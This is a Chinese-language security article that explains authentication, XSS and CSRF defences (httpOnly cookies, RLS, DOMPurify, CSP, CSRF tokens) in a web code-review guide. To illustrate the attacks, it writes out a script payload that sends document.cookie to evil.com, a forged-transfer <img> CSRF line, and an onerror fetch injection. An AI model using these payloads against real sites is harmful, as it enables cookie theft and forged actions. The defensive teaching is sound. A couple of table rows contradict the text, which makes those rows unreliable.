# security-review 深度分析（二）：鉴权与 Web 攻击防护

> 源文件：`skills/security-review/SKILL.md`（:139-272 行）
> 本篇聚焦：Authentication & Authorization + XSS Prevention + CSRF Protection
> 系列第 2 篇，共 4 篇

## 引言：身份与浏览器的安全

本篇覆盖"谁在操作 + 客户端攻击"的安全：

```
身份与浏览器
   │
   ├─ ④ Authentication & Authorization  ← 身份认证 + 权限
   │     - httpOnly cookie
   │     - 授权检查
   │     - Row Level Security
   │
   ├─ ⑤ XSS Prevention                  ← 脚本注入
   │     - DOMPurify 净化
   │     - CSP 头
   │
   └─ ⑥ CSRF Protection                 ← 伪造请求
         - CSRF token
         - SameSite cookie
```

这三个安全域的关系：鉴权确认"你是谁"，XSS 偷你的身份执行恶意脚本，CSRF 借你的身份发伪造请求。

## 一、Authentication & Authorization（认证与授权）

> 源文件 :139-193 | OWASP 映射：A01 Broken Access Control（失效的访问控制）、A07 Identification & Auth Failures

### 1.1 JWT Token 存储：httpOnly vs localStorage

**FAIL（绝对禁止）**：

```typescript
// (:143-144)
// WRONG: localStorage (vulnerable to XSS)
localStorage.setItem('token', token)
```

**PASS（必须这么做）**：

```typescript
// (:146-149)
// CORRECT: httpOnly cookies
res.setHeader('Set-Cookie',
  `token=${token}; HttpOnly; Secure; SameSite=Strict; Max-Age=3600`)
```

### 1.2 cookie 的 4 个属性

```
token=${token}; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
   │              │          │          │             │
   │              │          │          │             └─ 过期时间（秒）
   │              │          │          └─ 跨站策略
   │              │          └─ 仅 HTTPS
   │              └─ JS 不可读
   └─ cookie 值
```

| 属性 | 作用 | 不设的后果 |
|---|---|---|
| `HttpOnly` | JS（`document.cookie`）读不到 | XSS 能偷 token |
| `Secure` | 仅 HTTPS 传输 | 中间人可截获 |
| `SameSite=Strict` | 跨站不带 cookie | CSRF 可利用 |
| `Max-Age=3600` | 1 小时过期 | token 长期有效，泄露风险高 |

> **💡 为什么 localStorage 危险**
>
> | 存储方式 | XSS 能读吗 | 适合存 |
> |---|---|---|
> | `localStorage` | ✅ 能（`localStorage.getItem('token')`） | 非敏感的偏好设置 |
> | `sessionStorage` | ✅ 能 | 同上 |
> | **httpOnly cookie** | ❌ 不能 | **token（唯一正确选择）** |
>
> 一旦页面有 XSS 漏洞（见第二节），攻击脚本就能读 localStorage 偷走 token。httpOnly 让 JS 无法读取，即使有 XSS 也偷不到。

### 1.3 Authorization Checks（授权检查）

```typescript
// (:153-168)
export async function deleteUser(userId: string, requesterId: string) {
  // ALWAYS verify authorization first
  const requester = await db.users.findUnique({
    where: { id: requesterId }
  })

  if (requester.role !== 'admin') {
    return NextResponse.json(
      { error: 'Unauthorized' },
      { status: 403 }
    )
  }

  // Proceed with deletion
  await db.users.delete({ where: { id: userId } })
}
```

**3 步流程**：

```
    ┌─────────────────────────────────────┐
    │ ① 查询请求者身份                     │
    │    db.users.findUnique(requesterId) │
    └──────────────────┬──────────────────┘
                       ▼
    ┌─────────────────────────────────────┐
    │ ② requester.role !== 'admin'?       │
    │    ├─ 是 → 403 Unauthorized         │
    │    └─ 否 → 继续                      │
    └──────────────────┬──────────────────┘
                       ▼
    ┌─────────────────────────────────────┐
    │ ③ 执行删除                           │
    │    db.users.delete(userId)          │
    └─────────────────────────────────────┘
```

> **⚠️ 信息泄露隐患：返回 403 暴露用户存在性**
>
> 源文件对"用户不存在"和"无权限"都返回 403，会让攻击者**通过状态码枚举用户 ID 是否存在**：
>
> | 请求 | 实际情况 | 返回 | 攻击者推断 |
> |---|---|---|---|
> | DELETE userId=123 | 用户存在 + 无权 | 403 | "用户存在但我没权限" |
> | DELETE userId=999 | 用户**不存在** | ? | 若也 403，无法区分；若 404，则泄露 |
>
> **修复方向**：对**删除**这类敏感操作，无权限时统一返回 404（假装"不知道你在说什么"），避免泄露资源存在性。backend-patterns 第 3 篇明确：*"资源不存在时，无权限用户也返回 404"*。

### 1.4 Row Level Security（行级安全）

源文件 :171-185 给出 Supabase RLS 示例：

```sql
-- (:174) 开启 RLS
ALTER TABLE users ENABLE ROW LEVEL SECURITY;

-- (:177-179) 用户只能查自己的数据
CREATE POLICY "Users view own data"
  ON users FOR SELECT
  USING (auth.uid() = id);

-- (:182-184) 用户只能改自己的数据
CREATE POLICY "Users update own data"
  ON users FOR UPDATE
  USING (auth.uid() = id);
```

**RLS 的意义**：

```
传统应用层鉴权:
   代码: if (user.id === requester.id) { 查询 }
   ↓ 一旦某个查询漏了 if，数据就泄露

RLS（数据库层）:
   数据库: 自动过滤 auth.uid() = id
   ↓ 即使代码漏了鉴权，数据库也不返回别人的数据
```

> **💡 RLS 是纵深防御的最后一层**
>
> | 层 | 谁负责 | 防什么 |
> |---|---|---|
> | 代码层 | 开发者写 if 检查 | 业务逻辑错误 |
> | ORM 层 | 查询构建器 | 拼接错误 |
> | **RLS（数据库层）** | 数据库强制 | **代码层所有疏漏** |
>
> 即使前两层都漏了，RLS 仍能挡住"查别人的数据"。

### 1.5 RLS Policy 的结构

```sql
CREATE POLICY "策略名"
  ON 表名
  FOR SELECT | INSERT | UPDATE | DELETE      -- 操作类型
  USING (条件表达式)                          -- 行级过滤
  WITH CHECK (条件表达式)                     -- INSERT/UPDATE 后的检查
```

| 子句 | 作用 | 用于 |
|---|---|---|
| `USING` | 过滤**哪些行可见/可改** | SELECT / UPDATE / DELETE |
| `WITH CHECK` | 改后**新值是否合法** | INSERT / UPDATE |
| `auth.uid()` | Supabase 内置函数，返回当前用户 ID | 所有 policy |

### 1.6 Verification Steps

源文件 :187-192 给出 5 项检查：

| # | 检查项 | 含义 |
|---|---|---|
| 1 | Tokens stored in httpOnly cookies (not localStorage) | token 存 httpOnly |
| 2 | Authorization checks before sensitive operations | 敏感操作先查权限 |
| 3 | Row Level Security enabled in Supabase | RLS 已启用 |
| 4 | Role-based access control implemented | RBAC 已实现 |
| 5 | Session management secure | 会话管理安全 |

### 1.7 客户端类比

| 服务端概念 | iOS 类比 | Android 类比 |
|---|---|---|
| httpOnly cookie | HTTPCookieStorage（isSecure + isHTTPOnly） | CookieManager（setHttpOnly） |
| localStorage | UserDefaults（JS 可读） | SharedPreferences（Kotlin 可读） |
| RLS | CoreData 的 fetchRequest 加 predicate 过滤 | Room 的 @Query 加 WHERE userId=? |
| RBAC | App 的 `requiresAdmin` 检查 | `@RequiresPermission` 注解 |
| SameSite | SFSafariViewController 的跨域限制 | WebView 的 Cookie 策略 |

## 二、XSS Prevention（跨站脚本防护）

> 源文件 :194-241 | OWASP 映射：A03 Injection（XSS 子类）

### 2.1 XSS 攻击原理

```
用户提交评论: "<script>fetch('https://evil.com?c='+document.cookie)</script>"
   ↓ 未净化直接渲染
页面: <div>{用户内容}</div>
   ↓ 浏览器执行脚本
攻击者拿到 document.cookie（如果非 httpOnly）或发起其他操作
```

### 2.2 DOMPurify 净化

```typescript
// (:198-208)
import DOMPurify from 'isomorphic-dompurify'

// ALWAYS sanitize user-provided HTML
function renderUserContent(html: string) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],   // 白名单标签
    ALLOWED_ATTR: []                                  // 无属性
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

**净化的两层白名单**：

| 白名单 | 内容 | 作用 |
|---|---|---|
| `ALLOWED_TAGS` | `['b', 'i', 'em', 'strong', 'p']` | 只允许格式标签，禁 `<script>` `<iframe>` |
| `ALLOWED_ATTR` | `[]`（空） | 禁所有属性，防 `onclick=` `onerror=` 事件注入 |

> **💡 为什么 `ALLOWED_ATTR: []`**
>
> 属性是 XSS 重灾区：
>
> | 危险属性 | 攻击 |
> |---|---|
> | `onclick="alert(1)"` | 点击触发 |
> | `onerror="fetch(evil)"` | 加载失败触发 |
> | `src="javascript:..."` | 伪协议执行 |
> | `style="background:url(evil)"` | CSS 注入 |
>
> 除非业务必需（如 `href` 链接），默认禁所有属性最安全。

### 2.3 React 的双重防护

```typescript
return <div dangerouslySetInnerHTML={{ __html: clean }} />
```

`dangerouslySetInnerHTML` 是 React 的"逃生口"，绕过 React 的自动转义。**必须配合 DOMPurify**，否则就是裸 XSS。

```
React 默认（安全）:
   <div>{userInput}</div>
   → 自动转义，<script> 显示为文本

React dangerouslySetInnerHTML（危险）:
   <div dangerouslySetInnerHTML={{__html: userInput}} />
   → 直接当 HTML 执行 userInput
   → 必须 DOMPurify.sanitize 后才能用
```

> **💡 原则：能用 React 默认转义就别用 dangerouslySetInnerHTML**
>
> 只有"必须渲染富文本"的场景才用 `dangerouslySetInnerHTML + DOMPurify`。纯文本场景用默认 `{userInput}` 即可。

### 2.4 Content Security Policy（CSP）

源文件 :210-234 的 CSP 硬性约束：

```
Start strict and loosen only with a documented removal plan.
Do not default to 'unsafe-inline' or 'unsafe-eval'; they neutralize
much of CSP's protection and should be treated as temporary
compatibility debt.
```

**CSP 头配置**：

```typescript
// (:216-233)
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      base-uri 'self';
      object-src 'none';
      frame-ancestors 'none';
      script-src 'self';
      style-src 'self';
      img-src 'self' data: https:;
      font-src 'self';
      connect-src 'self' https://api.example.com;
    `.replace(/\s{2,}/g, ' ').trim()
  }
]
```

### 2.5 CSP 指令对照表

| 指令 | 值 | 含义 |
|---|---|---|
| `default-src 'self'` | 仅本域 | 默认策略（其他指令的 fallback） |
| `base-uri 'self'` | 仅本域 | 防 `<base>` 篡改 |
| `object-src 'none'` | 禁 | 禁 Flash/插件 |
| `frame-ancestors 'none'` | 禁 | 防 clickjacking 嵌入 |
| `script-src 'self'` | 仅本域脚本 | **禁内联/eval** |
| `style-src 'self'` | 仅本域样式 | 禁内联样式 |
| `img-src 'self' data: https:` | 本域 + data + https 图片 | 允许 data URI |
| `font-src 'self'` | 仅本域字体 | |
| `connect-src 'self' https://api.example.com` | 本域 + 指定 API | 限制 fetch/XHR 目标 |

> **⚠️ `style-src 'self'` 的兼容性问题**
>
> 许多前端框架（Next.js styled-jsx、Tailwind 的某些用法、CSS-in-JS 库）依赖**内联样式**。严格的 `style-src 'self'` 会破坏样式渲染。
>
> | 框架 | 是否需 `'unsafe-inline'` style |
> |---|---|
> | 纯 CSS 文件 | ❌ 不需要 |
> | Next.js 内联 critical CSS | ⚠️ 可能需要 |
> | styled-components / emotion | ⚠️ 可能需要 |
> | Tailwind（编译到文件） | ❌ 不需要 |
>
> **折中方案**：用 `style-src 'self' 'nonce-xxx'` 配合 nonce，只允许带特定 nonce 的内联样式。

### 2.6 `unsafe-inline` / `unsafe-eval` 的危害

源文件明确警告这两个是"temporary compatibility debt"：

| 指令 | 解禁内容 | 危害 |
|---|---|---|
| `'unsafe-inline'` | 允许内联 `<script>`/`style` | XSS 可直接注入内联脚本执行 |
| `'unsafe-eval'` | 允许 `eval()` / `new Function()` | 任意代码执行 |

```
有 CSP 但配 'unsafe-inline':
   攻击者注入: <script>alert(document.cookie)</script>
   CSP: "允许内联脚本" → 执行！
   ↓ CSP 形同虚设

严格 CSP:
   攻击者注入: <script>alert(...)</script>
   CSP: "只允许 self 脚本" → 阻止！
```

### 2.7 CSP 的工作流程

```
    ┌─────────────────────────────────────┐
    │ 浏览器请求页面                        │
    └──────────────────┬──────────────────┘
                       ▼
    ┌─────────────────────────────────────┐
    │ 服务端返回 HTML + CSP 头              │
    │    Content-Security-Policy: ...       │
    └──────────────────┬──────────────────┘
                       ▼
    ┌─────────────────────────────────────┐
    │ 浏览器解析 CSP                        │
    │    建立资源加载白名单                  │
    └──────────────────┬──────────────────┘
                       ▼
    ┌─────────────────────────────────────┐
    │ 每个资源请求                          │
    │    ├─ 符合白名单 → 加载                │
    │    └─ 违规 → 阻止 + 报告（report-uri）│
    └─────────────────────────────────────┘
```

### 2.8 Verification Steps

源文件 :236-240 给出 4 项检查：

| # | 检查项 | 含义 |
|---|---|---|
| 1 | User-provided HTML sanitized | 用户 HTML 过 DOMPurify |
| 2 | CSP headers configured | CSP 头已配 |
| 3 | No unvalidated dynamic content rendering | 无未校验的 dangerouslySetInnerHTML |
| 4 | React's built-in XSS protection used | 优先用 React 默认转义 |

### 2.9 客户端类比

| 服务端概念 | iOS 类比 | Android 类比 |
|---|---|---|
| DOMPurify | NSAttributedString 的 `init(data:options:)` 安全解析 | Jsoup 的 `clean()` |
| CSP | App Transport Security（ATS） | Network Security Config |
| `default-src 'self'` | ATS 仅允许 HTTPS | `cleartextTrafficPermitted=false` |
| `script-src 'self'` | 仅信任 bundle 内 JS（WKWebView 限制） | WebView 禁用 `addJavascriptInterface` |
| XSS 漏洞 | UIWebView 的 `stringByEvaluatingJavaScript` 注入 | WebView `evaluateJavascript` 注入 |

## 三、CSRF Protection（跨站请求伪造防护）

> 源文件 :242-272 | OWASP 映射：A01 Broken Access Control

### 3.1 CSRF 攻击原理

```
1. 用户登录 bank.com（cookie 已设）
2. 用户访问 evil.com
3. evil.com 页面藏:
     <img src="https://bank.com/transfer?to=hacker&amount=1000">
4. 浏览器自动带 bank.com 的 cookie 发请求
5. bank.com 收到"合法"cookie 的转账请求 → 执行！
```

**关键**：攻击者不需要偷 token，**借浏览器自动带 cookie** 即可。

### 3.2 CSRF Token 防护

```typescript
// (:245-260)
import { csrf } from '@/lib/csrf'

export async function POST(request: Request) {
  const token = request.headers.get('X-CSRF-Token')

  if (!csrf.verify(token)) {
    return NextResponse.json(
      { error: 'Invalid CSRF token' },
      { status: 403 }
    )
  }

  // Process request
}
```

**CSRF token 的工作流程**：

```
① 登录成功
   服务端生成 csrf token
   └─ 通过 Set-Cookie 或返回 body 给前端

② 前端存储 token
   └─ 存 JS 可读处（因为要主动放到 header）

③ 发 POST 请求
   └─ header: X-CSRF-Token: xxx（JS 主动加）
   └─ cookie: session=yyy（自动带）

④ 服务端验证
   └─ csrf.verify(token) ? 通过 : 403
```

> **💡 为什么 CSRF token 能防 CSRF**
>
> | 请求来源 | 带 cookie | 带 CSRF token |
> |---|---|---|
> | 正常用户的 POST（前端主动加 header） | ✅ | ✅（JS 能读 token） |
> | evil.com 的 `<img>`/`<form>` | ✅（自动） | ❌（跨域拿不到 token） |
>
> CSRF token 的本质是**"只有你的前端代码才知道的秘密"**。跨站请求带不走这个秘密。

> **⚠️ 问题：`@/lib/csrf` 未提供实现**
>
> 源文件 :246 `import { csrf } from '@/lib/csrf'` 引用了项目内部模块，但 skill **未提供 `@/lib/csrf` 的实现**。开发者需自行实现：
>
> - token 生成（`crypto.randomUUID()`）
> - token 存储（签名后放 cookie，或 session 关联）
> - token 校验（签名验证）
>
> 常见实现：**double-submit cookie 模式**（见 3.3）。

### 3.3 SameSite Cookie

```typescript
// (:264-266)
res.setHeader('Set-Cookie',
  `session=${sessionId}; HttpOnly; Secure; SameSite=Strict`)
```

**SameSite 三种值**：

| 值 | 跨站请求带 cookie | 安全性 | 兼容性 |
|---|---|---|---|
| `Strict` | ❌ 不带（任何跨站都不带） | 最强 | 影响体验（外链跳转需重登） |
| `Lax` | ⚂️ 仅顶层 GET 导航带 | 中（默认值） | 平衡 |
| `None` | ✅ 都带（需配 Secure） | 最弱 | 第三方 cookie 场景 |

```
SameSite=Strict:
   用户点邮件里的 bank.com 链接
   → 浏览器跳转，但不带 cookie
   → 用户看到登录页（即使已登录）
   ↓ 体验差但最安全

SameSite=Lax（默认）:
   顶层 GET 导航带 cookie（点链接能保持登录）
   POST/跨站子资源不带（防 CSRF）
   ↓ 平衡选择
```

### 3.4 双重防护：token + SameSite

源文件同时给出两种防护（:244 CSRF token + :262 SameSite），是**纵深防御**：

```
CSRF 攻击需突破两道:
   ① SameSite=Strict → 跨站请求根本不带 cookie
   ② CSRF token → 即使带了 cookie，没 token 也拒
   ↓ 任一挡住，攻击失败
```

| 防护 | 挡什么 | 漏什么 |
|---|---|---|
| SameSite | 跨站不带 cookie | 同站 CSRF（子域名攻击） |
| CSRF token | 无 token 即拒 | token 泄露（XSS 偷 token） |
| **两者叠加** | 互补盲区 | 需 XSS 同时得逞 |

### 3.5 Verification Steps

源文件 :268-271 给出 3 项检查：

| # | 检查项 | 含义 |
|---|---|---|
| 1 | CSRF tokens on state-changing operations | 状态变更操作加 token |
| 2 | SameSite=Strict on all cookies | 所有 cookie 配 SameSite |
| 3 | Double-submit cookie pattern implemented | 双提交 cookie 模式 |

**双提交 cookie 模式**：token 既存 httpOnly cookie（让浏览器带），又存 JS 可读处（让前端放 header），服务端比对两者一致。

## 四、三个安全域的协作

### 4.1 攻击链与防护

```
XSS 偷 token → 但 httpOnly 挡住（① Auth）
   ↓ 失败

CSRF 借身份 → 但 SameSite 挡住（③ CSRF）
   ↓ 失败

越权访问 → 但 RLS 挡住（① Auth）
   ↓ 失败
```

### 4.2 httpOnly 与 CSRF 的协同

```
cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
                ↑              ↑          ↑
                │              │          └─ 防 CSRF（跨站不带）
                │              └─ 防 MITM（仅 HTTPS）
                └─ 防 XSS 偷 token（JS 读不到）
```

`HttpOnly` 与 `SameSite` 解决不同问题，缺一不可。

### 4.3 与 backend-patterns 的协作

| backend-patterns 篇目 | 本篇对应 |
|---|---|
| 第 4 篇：鉴权（JWT 验证、RBAC、HOF） | 本篇 Auth（httpOnly cookie、授权检查） |
| 第 4 篇：限流 | 本篇 Rate Limit（第 3 篇详述） |
| 第 3 篇：错误处理 | 本篇 403 返回格式 |

**职责分工**：

| 关注点 | backend-patterns | security-review |
|---|---|---|
| JWT 怎么验证 | ✅ verifyToken 实现 | ❌ 不涉及 |
| token 存哪 | ❌ 不涉及 | ✅ httpOnly cookie |
| 授权检查怎么做 | ✅ HOF 装饰器 | ✅ 每个操作先查权限 |
| RLS | ❌ 不涉及 | ✅ Supabase 行级安全 |
| XSS/CSRF | ❌ 不涉及 | ✅ 本篇核心 |

## 五、设计哲学

### 5.1 身份安全的纵深防御

| 层 | 防护 | 防什么 |
|---|---|---|
| 存储 | httpOnly cookie | XSS 偷 token |
| 传输 | Secure + HTTPS | 中间人截获 |
| 跨站 | SameSite=Strict | CSRF 借身份 |
| 应用 | 授权检查 + RBAC | 越权操作 |
| 数据库 | RLS | 代码层疏漏 |

### 5.2 默认严格原则

| 场景 | 默认值 | 放宽条件 |
|---|---|---|
| CSP | 严格（无 unsafe-inline） | 有文档化的移除计划 |
| SameSite | Strict | 必要时 Lax |
| cookie | HttpOnly | 仅前端需读时才不加 |
| ALLOWED_TAGS | 最小集 | 业务需要才加 |
| ALLOWED_ATTR | 空 | 业务需要才加 |

> **💡 "Start strict, loosen with plan"**
>
> CSP 的这条原则适用于所有安全配置：**默认最严，放宽时必须留痕**。这避免"为了图方便开个口子"导致长期安全债。

### 5.3 Fail-Safe（安全失败）

| 失败场景 | 行为 | 反例（危险） |
|---|---|---|
| token 校验失败 | 403 拒绝 | 放行（fail open） |
| CSRF token 缺失 | 403 拒绝 | 放行 |
| 权限不足 | 403 | 用默认权限继续 |
| DOMPurify 出错 | 返回空字符串 | 返回原始 HTML |

## 六、反模式汇总

### 6.1 认证授权反模式

| ❌ 反模式 | 问题 | ✅ 正确做法 |
|---|---|---|
| token 存 localStorage | XSS 可偷 | httpOnly cookie |
| cookie 不设 HttpOnly | JS 可读 | 必设 HttpOnly |
| cookie 不设 Secure | HTTP 可截获 | 必设 Secure |
| cookie 不设 SameSite | CSRF 可利用 | SameSite=Strict |
| 删除操作无权返回 404 | 泄露资源存在性 | 无权也返回 404 |
| 不开 RLS | 代码层疏漏即泄露 | 启用 RLS 兜底 |

### 6.2 XSS 反模式

| ❌ 反模式 | 问题 | ✅ 正确做法 |
|---|---|---|
| 用户 HTML 直接渲染 | XSS | DOMPurify.sanitize |
| `ALLOWED_ATTR` 含事件 | onclick 注入 | 默认空 |
| 用 `dangerouslySetInnerHTML` 不净化 | 裸 XSS | 必须配 DOMPurify |
| CSP 配 `'unsafe-inline'` | CSP 失效 | 严格 + nonce |
| CSP 配 `'unsafe-eval'` | 允许 eval | 用 CSP nonce 替代 |

### 6.3 CSRF 反模式

| ❌ 反模式 | 问题 | ✅ 正确做法 |
|---|---|---|
| 无 CSRF token | CSRF 可利用 | token + SameSite 双重 |
| token 存 httpOnly cookie | 前端读不到放 header | 双提交 cookie 模式 |
| SameSite=None 不配 Secure | 跨站裸传 | None 必须配 Secure |
| GET 请求改状态 | `<img>` 即可 CSRF | 状态变更用 POST |

## 七、规则总结表

| 类别 | 规则 | 严重度 |
|---|---|---|
| 认证 | token 存 httpOnly cookie（非 localStorage） | **CRITICAL** |
| 认证 | cookie 必设 HttpOnly + Secure + SameSite | **CRITICAL** |
| 认证 | cookie 设 Max-Age 过期 | HIGH |
| 授权 | 敏感操作先查权限 | **CRITICAL** |
| 授权 | 删除无权资源返回 404（非 403） | HIGH（⚠️ 源文件需改进） |
| 授权 | Supabase 启用 RLS | HIGH |
| 授权 | RBAC 实现 | HIGH |
| XSS | 用户 HTML 必过 DOMPurify | **CRITICAL** |
| XSS | ALLOWED_TAGS 用最小白名单 | HIGH |
| XSS | ALLOWED_ATTR 默认空 | HIGH |
| XSS | 优先 React 默认转义 | 标准 |
| CSP | 严格起步，有计划才放宽 | HIGH |
| CSP | 默认禁 `'unsafe-inline'` / `'unsafe-eval'` | **CRITICAL** |
| CSP | `style-src 'self'` 注意框架兼容性 | ⚠️ 需测试 |
| CSRF | 状态变更操作加 CSRF token | **CRITICAL** |
| CSRF | 所有 cookie 设 SameSite=Strict | HIGH |
| CSRF | 实现 double-submit cookie 模式 | HIGH |
| 实现 | `@/lib/csrf` 需自行实现（源文件未给） | ⚠️ 待补 |

---

## 下一篇

- [security-review 深度分析（三）：限流与数据暴露](./security-review-深度分析-三-限流与数据暴露.md) — 限流、日志脱敏、错误信息分级暴露
